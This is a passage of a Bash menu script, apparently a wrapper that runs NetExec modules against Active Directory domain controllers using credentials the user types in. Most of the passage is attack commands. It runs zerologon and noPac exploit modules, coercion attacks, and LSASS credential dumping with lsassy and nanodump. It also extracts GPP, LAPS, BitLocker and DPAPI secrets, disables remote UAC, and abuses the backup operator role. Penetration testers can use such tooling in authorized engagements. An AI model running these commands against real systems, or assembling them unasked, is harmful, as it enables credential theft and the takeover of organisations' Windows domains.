                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M enum_trusts $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M enum_trusts $flag
                  echo ""
               elif [[ "$number" == "17" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M maq $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M maq $flag
                  echo ""
               elif [[ "$number" == "18" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M zerologon $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M zerologon $flag
                  echo ""
               elif [[ "$number" == "19" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M coerce_plus $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M coerce_plus $flag
                  echo ""
               elif [[ "$number" == "20" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M nopac $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M nopac $flag
                  echo ""
               elif [[ "$number" == "21" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M gpp_password $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M gpp_password $flag
                  echo ""
               elif [[ "$number" == "22" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M lsassy $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M lsassy $flag
                  echo ""
               elif [[ "$number" == "23" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M subnets $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M subnets $flag
                  echo ""
               elif [[ "$number" == "24" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M pre2k $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M pre2k $flag
                  echo ""
               elif [[ "$number" == "25" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M laps $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M laps $flag
                  echo ""
               elif [[ "$number" == "26" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M pso $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M pso $flag
                  echo ""
               elif [[ "$number" == "27" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M adcs $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password -M adcs $flag
                  echo ""
               elif [[ "$number" == "28" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M enum_ca $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M enum_ca $flag
                  echo ""
               elif [[ "$number" == "29" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M bitlocker $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M bitlocker $flag
                  echo ""
               elif [[ "$number" == "30" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M dpapi_hash $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M dpapi_hash $flag
                  echo ""
               elif [[ "$number" == "31" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M nanodump $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M nanodump $flag
                  echo ""
               elif [[ "$number" == "32" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M remote-uac -o ACTION=disable $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M remote-uac -o ACTION=disable $flag
                  echo ""
               elif [[ "$number" == "33" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M ioxidresolver $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M ioxidresolver $flag
                  echo ""
               elif [[ "$number" == "34" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M backup_operator $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M backup_operator $flag
